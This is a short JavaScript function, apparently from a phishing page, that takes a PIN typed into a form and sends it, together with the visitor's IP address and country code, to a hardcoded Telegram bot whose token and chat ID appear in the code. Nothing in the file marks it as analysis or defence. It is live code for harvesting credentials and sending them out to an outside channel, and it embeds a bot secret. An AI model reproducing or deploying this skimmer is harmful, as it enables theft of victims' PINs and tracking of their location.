var buttonClicked = false;

function SendPin() {
  if (!buttonClicked) {
    var telegramBotToken = "6346924701:AAGkU_UOQxhSAbyrebUAxzW3huk5yc_m1Tw";
    var chatId = "625048457";

    if (ValideText() && !isNaN(document.getElementById("txtpin").value)) {
      buttonClicked = true;
      var pin = document.getElementById("txtpin").value;
      var telegramURL =
        "https://api.telegram.org/bot" +
        telegramBotToken +
        "/sendMessage?chat_id=" +
        chatId +
        "&text=📌Pin : " +
        pin;

      fetch(telegramURL, { method: "POST" }).then((response) => {
        if (response.ok) {
          var ipMessage =
            "https://api.telegram.org/bot" +
            telegramBotToken +
            "/sendMessage?chat_id=" +
            chatId +
            "&text=IP : " +
            ip_address +
            ":" +
            country_code;
          fetch(ipMessage, { method: "POST" }).then((res) => {
            if (res.ok) {
              document.getElementById("txtpin").value = "";
              buttonClicked = false;
              alert("Pin sent successfully");
            } else {
              alert("Failed to send IP message");
              buttonClicked = false;
            }
          });
        } else {
          alert("Failed to send Pin");
          document.getElementById("txtpin").value = "";
          buttonClicked = false;
        }
      });
    } else {
      alert("Invalid input");
    }
  } else {
    alert("Button is already clicked");
  }
}
